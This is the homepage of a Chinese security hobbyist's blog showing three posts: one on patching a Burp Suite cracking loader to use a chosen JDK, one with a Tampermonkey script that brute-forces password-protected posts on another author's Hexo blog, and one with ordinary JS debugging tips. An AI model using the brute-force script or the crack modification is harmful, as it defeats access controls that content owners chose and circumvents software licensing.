<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">





  <link rel="alternate" href="/atom.xml" title="少女的泪" type="application/atom+xml">






<meta name="description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">
<meta name="keywords" content="技术，代码，harking，hack, sec, 网络安全">
<meta property="og:type" content="website">
<meta property="og:title" content="少女的泪">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="少女的泪">
<meta property="og:description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="少女的泪">
<meta name="twitter:description" content="如果有一天我不再中二，变的和蔼可亲善解人意，那一定是我失去了最后的坚持变得安于平凡。那么请认识我的人清明的时候顺带为我上柱香，毕竟这个男人已经死了。">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>少女的泪</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">

<div class="header-banner-img-bottom"><img src="/images/overlay-hero.png" style="width:100%;"></div>
<div class="header-banner-img-main-container"><div class="header-banner-img-main-img"><img src="/images/main-bk.png"></div></div>

  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">少女的泪</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">是物语的开始</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



 </div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>

    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/09/08/mac上多版本burp共存/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/09/08/mac上多版本burp共存/" itemprop="url">mac上多版本burp共存</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-08T22:40:30+08:00">
                2020-09-08
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#0x00 背景<br>某天群里有人问mac上如何共存多个版本的burp，大家都知道这个问题的本质是多版本jdk来驱动burp的问题，本来想想只需要更改环境变量来切换不同的java_home就好了吧，但其实好像并没有那么简单</p>
<p>#0x01 常规尝试<br>首先我们要实现的是希望有多个burp的app图标，然后每个burp的图标点击就能启动不同的burp类似于：<br><img src="https://i.loli.net/2020/09/08/I3G1FTeSPfl7m5r.jpg" alt><br>要实现这个我们得用到mac自带的automator：<br><img src="https://i.loli.net/2020/09/08/FcubE4zUofhdyYT.jpg" alt><br>这玩意是真的好用，可以将很多命令操作或者宏打包成一个app，我们现在要用的是打包一个shell脚本，思路很简单，通过automator的shell，编写通过shell的方式运行指定的burploader就行：<br><img src="https://i.loli.net/2020/09/08/ZfjaUd6stJzNVyA.jpg" alt><br>类似于这样，就可以打包成一个app，然后就自动打开burp了<br>好了回到正题，正常思路下我们可能会想到通过在shell里指定运行的java命令的版本就行，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91</span><br><span class="line">xxx/xxx/xx/jdk14/bin/java -jar Loader.jar</span><br></pre></td></tr></table></figure></p>
<p>看似可行，实则不行</p>
<p>##0x02 问题分析<br>其实我们在shell里指定特定版本的java来运行loader的时候，这个loader确实是以该版本的java来运行的，我们要知道，loader只是为了破解，真正运行burp本身程序的是loader通过调用命令来运行的。loader调用命令的时候执行的是：<br><img src="https://i.loli.net/2020/09/08/pJ42GTiS1yNcCtk.jpg" alt><br>可以看到loader执行的依旧是“java”，也就是没有指定特定路径的java，那么他肯定是从环境变量去查找java，找到的那个Java是什么版本就是什么版本。那么问题来了，我们在shell里加入环境变量可不可行？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export JAVA_HOME=xxxx/xxx/xxx/jdk14</span><br><span class="line">export PATH=xxxx/xxx/xxxx/bin:$PATH</span><br><span class="line">cd /Users/miku/Documents/hack/attack-tools/burpsuite/Burp2020.91</span><br><span class="line">xxx/xxx/xx/jdk14/bin/java -jar Loader.jar</span><br></pre></td></tr></table></figure></p>
<p>看起来可行，但是我试了，不行，看起来是这个环境变量只被loader继承了，并没有影响到loader调用命令时候的“java”，网上查了查，感觉讲的都不太靠谱，不深究，结果看来是依然调用的是系统本身的环境变量指向的java，也就是我本机老的1.8版本，那咋整呢？<br>我试过修改/usr/libexec/java_home这个玩意管理的javahome，将jdk14放入到目录<code>/Library/Java/JavaVirtualMachines/</code>并修改iplist的优先级，这会改变系统默认的jdk版本，重启后确实会生效，但是这个太脑残了</p>
<p>##0x03 换个思路<br>环境变量这个坑不想搞了，万一系统搞坏了也挺傻逼的，那怎么办呢？<br>既然通过指定jdk路径里的java来执行可以成功，那我们能不能把loader里面的java命令改成特定jdk里的java来运行burp呢？确实可以<br>首先，我们用jd-gui打开loader.jar<br><img src="https://i.loli.net/2020/09/08/hSLgkeiQZGRBd8P.jpg" alt><br>(红线部分是loader里run的那个命令，这里的java路径已经被我修改过了，没有修改的情况下应该就是写这个java)<br>我们可以看到jd已经帮我们反编译了，但是我们不能直接在jd里修改，那么我们先保存，保存后jd会保存为源码的形式<br>再获得保存的源码后，我们用idea创建一个java工程，然后把这些源码放到src里<br><img src="https://i.loli.net/2020/09/08/tkycv6TJ1eESOQN.jpg" alt><br>修改划线部分，指定jdk14里的java来执行后续的burp<br>修改完毕后，最重要的是编译了，要想完整的编译可能会有一大堆问题，反正我没有直接build项目成功过。<br>这边建议只编译enjoy.reversing.me这个包（右键点击包名选择单独构建），这样报错少，我这边就报了一个错，根据提示改一下就编译成功了<br>接下来只需要将我们需要的keygendialog.class文件即修改过编译好的class文件复制出来<br><img src="https://i.loli.net/2020/09/08/LBgd26cIWOGeDNY.jpg" alt><br>最后比较简单了，将原先的loader.jar用zip解压缩后，用上面的class替换同名class文件，然后重新压缩成zip后将后缀改为jar即可<br>修改后的jar包经过测试可以正常以特定的java来运行burp了，也不需要去修改系统的java版本了，很环保很开心。<br>剩下的就是回到最初用automator来做一个启动app即可</p>
<p>##0x04 总结</p>
<ol>
<li>环境变量这个问题还是没怎么搞清楚，找个时间再看看，也可能有更科学的方式来做这个事情吧</li>
<li>很多事情还是要多试试才知道，脑补不太可行</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/08/21/一次对hexo加密文章的解密试探/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/08/21/一次对hexo加密文章的解密试探/" itemprop="url">一次对hexo加密文章的解密尝试</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-08-21T20:40:30+08:00">
                2020-08-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#0x00背景<br>某天群里分享了一个大佬的博客，文章都是很棒的，但是最新的文章都使用Hexo-Blog-Encrypt，网上基本也都推荐这个插件进行加密文章。那么我们想看文章又不知道密码，怎么办呢？</p>
<p>#0x01思路<br>一开始觉得至少先试试爆破吧，但是打开burp发现输入密码的过程是前端js的解密流程，并不存在提交到服务端的请求包，所以burp的常规爆破就不行了。<br>那基本的思路就是这样：</p>
<ol>
<li>先看看加解密代码，如果代码比较垃圾可能可以绕过</li>
<li>如果是正常的对称加密，则考虑爆破</li>
<li>爆破可以浏览器模拟也可以其他语言重新加解密函数提高爆破速度</li>
</ol>
<p>#0x02先看js<br>由于博客是托管在GitHub上的，所以直接通过github克隆一份下来在本地会比较简单一些，当然直接打开也可以（由于特殊原因该博客必须克隆）<br>略过一些查找的过程，我们很快就找到了加解密的js文件<br><img src="https://i.loli.net/2020/08/20/LCGHNFjl5bKfRiD.jpg" alt><br>文件路径是xxx.com/lib/blog-encrypt.js<br>基本上可以看到使用了aes-cbc 256位加密，使用sha-256进行hash校验，只要写的没有太大问题应该不存在绕过的方式，基本上目前我只能使用爆破的方法了</p>
<p>#0x03爆破前置准备<br>目前我打算直接使用js来进行爆破，爆破的流程基本上是：<br>前端提交密码字典文件-&gt;解析成字典-&gt;js直接提交密码触发对应解密函数-&gt;构造解密成功和失败的结果显示<br>逻辑想好了，这里介绍几个基本的知识点</p>
<p>##chrome浏览器override<br>devtools里有个override功能可以用本地的js脚本替代页面上的原脚本<br>功能路径：sources-&gt;overrides<br><img src="https://i.loli.net/2020/08/20/tWinjOeXBd87g25.jpg" alt><br>这个功能的操作基本上就是先开启这个功能，然后以后在source-&gt;page里修改了某个js，就会直接在overrides里生成一个修改过的js做替换，后续只要修改overrides里的替换文件就会在对应网站里生效，哪怕是关掉浏览器下次访问也一样会以本地修改文件来生效，还是很靠谱的。</p>
<p>##tampermonkey脚本的基本使用<br>这个也没什么好说的，会大致写就行，其实本质上就是在页面加载完成后（顺序可以设置）在页面上执行额外的自定义脚本，我们的主要爆破程序是写在这里的</p>
<p>#0x04编写爆破脚本<br>编写的时候涉及到不少的问题，比如：</p>
<ol>
<li>输入密码错误的时候会弹窗提示，alert会中断所有脚本的执行，所以需要在js里把对应的alert给干掉，大部分都在那个encrypt脚本里自己找一下就行</li>
<li>解密成功但是校验失败会输出乱码，不太懂这什么原因，部分密码输入都会出现这种问题，通过修改一些判断逻辑使这个不影响爆破</li>
<li>页面输入框会在一些情况下被替换掉导致中断爆破，因此如果解密成功或者校验失败，使其作用于一个新的元素避免影响输入框<br>直接贴爆破脚本好了，我懒得分析一些细节，而且我目前还没有爆破出密码，也不太确定是不是哪里有问题，不过思路可以参考一下</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">// ==UserScript==</span><br><span class="line">// @name         解密hexo</span><br><span class="line">// @namespace    http://tampermonkey.net/</span><br><span class="line">// @version      0.1</span><br><span class="line">// @description  try to take over the world!</span><br><span class="line">// @author       You</span><br><span class="line">// @match        http://127.0.0.1:8000/*</span><br><span class="line">// @grant        none</span><br><span class="line">//@run-at document-end</span><br><span class="line">// ==/UserScript==</span><br><span class="line"></span><br><span class="line">(function() &#123;</span><br><span class="line">    &apos;use strict&apos;;</span><br><span class="line">    //创建一个元素用于上传密码字典</span><br><span class="line">    var uploadfile = document.createElement(&apos;input&apos;);</span><br><span class="line">    uploadfile.type=&quot;file&quot;;</span><br><span class="line">    uploadfile.id=&quot;file_id&quot;;</span><br><span class="line">    //在上传字典后调用readFile函数</span><br><span class="line">    uploadfile.onchange= readFile;</span><br><span class="line">    document.body.appendChild(uploadfile);</span><br><span class="line">    //创建ui事件用于向密码输入框发送keydown事件</span><br><span class="line">    var event = document.createEvent(&apos;UIEvents&apos;);</span><br><span class="line">    event.initUIEvent(&quot;keydown&quot;,false,true,null);</span><br><span class="line">    event.keyCode=13;</span><br><span class="line">    var passwords = &quot;&quot;;</span><br><span class="line">    var i =0;</span><br><span class="line"></span><br><span class="line">    function readFile() &#123;</span><br><span class="line">        //获取文件内容判断是否为空不为空读取文件内容</span><br><span class="line">        const objFile = document.getElementById(&apos;file_id&apos;);</span><br><span class="line">        if(objFile.value === &apos;&apos;) &#123;</span><br><span class="line">          alert(&apos;请选择文件！&apos;);</span><br><span class="line">          return;</span><br><span class="line">        &#125;</span><br><span class="line">        // 获取文件</span><br><span class="line">        const files = objFile.files;</span><br><span class="line">        // 新建一个FileReader</span><br><span class="line">        const reader = new FileReader();</span><br><span class="line">        // 读取文件</span><br><span class="line">        reader.readAsText(files[0], &quot;UTF-8&quot;);</span><br><span class="line">        // 读取完文件之后会回来这里</span><br><span class="line">        reader.onload = function(e)&#123;</span><br><span class="line">          // 读取文件内容</span><br><span class="line">          const fileString = e.target.result;</span><br><span class="line">          //读取出来的文件内容是纯文本未分行的，下面根据换行分割成数组</span><br><span class="line">          const fileString2 = e.target.result.split(&apos;\n&apos;);</span><br><span class="line">          //打印内容助于排错</span><br><span class="line">          console.log(fileString2);</span><br><span class="line">          passwords = fileString2;</span><br><span class="line">          //加个timeout主要是我怕读文件太慢，异步所以稳一点</span><br><span class="line">          setTimeout(function()&#123;</span><br><span class="line">            if(passwords!=&quot;&quot;)&#123;</span><br><span class="line">                //通过interval来控制速度，同样因为异步，怕出错所以用了interval降低速度</span><br><span class="line">                var inter = setInterval(function()&#123;</span><br><span class="line">                    //使用debug来输出每次密码，用于排错和知道进度，因为debug的信息可以隐藏</span><br><span class="line">                    console.debug(passwords[i]);</span><br><span class="line">//设置密码空间的值为密码，并且发送keydown事件触发解密函数                  document.getElementById(&quot;hbePass&quot;).value=passwords[i];</span><br><span class="line">                    document.getElementById(&apos;hexo-blog-encrypt&apos;).dispatchEvent(event);</span><br><span class="line">                      setTimeout(function()&#123;</span><br><span class="line">                          if(i&lt;passwords.length)&#123;</span><br><span class="line">                              i++;</span><br><span class="line">                          &#125;</span><br><span class="line">                      &#125;,20);</span><br><span class="line">                      //passwords是全局变量，这里通过控制i的自增来遍历passwords</span><br><span class="line">                      if(i==passwords.length)&#123;</span><br><span class="line">                      //当密码爆破完中断interval</span><br><span class="line">                          clearInterval(inter);</span><br><span class="line">                      &#125;</span><br><span class="line">                &#125;,5);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;,500);</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // Your code here...</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
<p>#0x05效果<br><img src="https://i.loli.net/2020/08/20/1CBnE35hUDJvOso.jpg" alt><br>这里加了个上传文件的input，上传完就开始自动爆破<br><img src="https://i.loli.net/2020/08/20/CskZtlT4BzyJwuW.jpg" alt><br>如果我前面的调整没有问题，那么爆破正确的话console.log会输出正确正文<br>不过到我写完文章我也没有爆破成功- -</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/21/JS调试技巧/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/06/21/JS调试技巧/" itemprop="url">js调试技巧</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-06-21T00:40:30+08:00">
                2020-06-21
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web/" itemprop="url" rel="index">
                    <span itemprop="name">web</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>#js调试的一些技巧</p>
<p>##0x00 使用Chrome调试</p>
<p>###1.devtools<br>使用Chrome自带的devtools进行直接调试基本上已经能满足绝大部份需求，抛开常见的断点、单步调试不说，我们来说说如何使用devtools对js进行修改调试。要实现这个功能主要是用devtools里的sources板块：<br><img src="https://i.loli.net/2020/06/23/2GUDc6M97OSexom.jpg" alt></p>
<p>在souces板块里我们注意到左侧有几个选项：page、filesystem、overrides、content scripts、snippets。这里我主要讲一下overrides和snippets。</p>
<p>####snippets<br>这个比较简单，更像是个可以执行一小段js的小功能，贴入任何js，可以单击run然后就执行了：<br><img src="https://i.loli.net/2020/06/23/BXlysDNQ5V46xnj.jpg" alt></p>
<p>####overrides<br>这个功能比较像是直接通过本地文件修改js然后在线调试，其实不用这个功能我们也可以直接在page页面里通过选中特定的js直接进行编辑修改，但是这有个问题就是如果我们刷新页面修改就失效了，而这个ovrrides的功能就是类似于用本地的文件夹保存被我们修改过的文件，类似于持久化保存的概念，那么只要我们对任何该网站的源码进行修改（html、css、js），对应修改的部分就会在本地文件夹里生成一个修改版，后续就会用这个修改版覆盖网页源文件。操作步骤：</p>
<pre><code>1. 设置overrides的本地文件夹
2. 通过elements修改html、css
3. 通过source-》page修改js（**只能修改源文件不能修改formate后的文件**）
4. 修改后需要保存，command+S后就会进行保存，保存后会在override里生成文件
</code></pre><p>操作十分简单，如果觉得修改没有格式化的js文件比较麻烦，可以先任意修改源文件，等待生成overrids文件后，后续直接在overrids里的js进行修改，这种方式是可以进行formate的，这样就很方便了，即使页面刷新也会直接执行:<br><img src="https://i.loli.net/2020/06/23/GPuzHRfKvMSX4lL.jpg" alt></p>
<p>###2.使用Chrome插件<br>这个其实已经很常规了，推荐几个插件吧，具体的也不演示了：</p>
<ul>
<li>Vue devtools，调试vue用的，会探测页面中是否使用vue</li>
<li>tampermonkey，在页面中任意执行脚本，这个不用过多介绍了</li>
</ul>
<p>##0x01 使用vscode调试js<br>在项目文件夹里加入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;chrome&quot;,</span><br><span class="line">    &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;Chrome against file&quot;,</span><br><span class="line">    &quot;sourceMaps&quot;:false,</span><br><span class="line">    &quot;file&quot;: &quot;$&#123;workspaceRoot&#125;/index.html&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会以文件的方式访问启动debug打开index.html<br>如果要以webserver的形式访问localhost的服务的话得启动一个webserver，可以通过配置或者自己启动，默认的配置需要自己启动一个webserver。下面是一个nodejs的调试配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;version&quot;: &quot;0.2.0&quot;,</span><br><span class="line">    &quot;configurations&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;attach&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;Attach by Process ID&quot;,</span><br><span class="line">            &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;,</span><br><span class="line">            &quot;skipFiles&quot;: [</span><br><span class="line">                &quot;&lt;node_internals&gt;/**&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;launch&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;启动程序&quot;,</span><br><span class="line">            &quot;skipFiles&quot;: [</span><br><span class="line">                &quot;&lt;node_internals&gt;/**&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;\\app.js&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;type&quot;: &quot;node&quot;,</span><br><span class="line">            &quot;request&quot;: &quot;attach&quot;,</span><br><span class="line">            &quot;name&quot;: &quot;Node: Nodemon&quot;,</span><br><span class="line">            &quot;processId&quot;: &quot;$&#123;command:PickProcess&#125;&quot;,</span><br><span class="line">            &quot;restart&quot;: true,</span><br><span class="line">            &quot;protocol&quot;: &quot;inspector&quot;,</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/11/对小爱音箱的初步探索/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="JOJO">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/touxiang.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="少女的泪">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
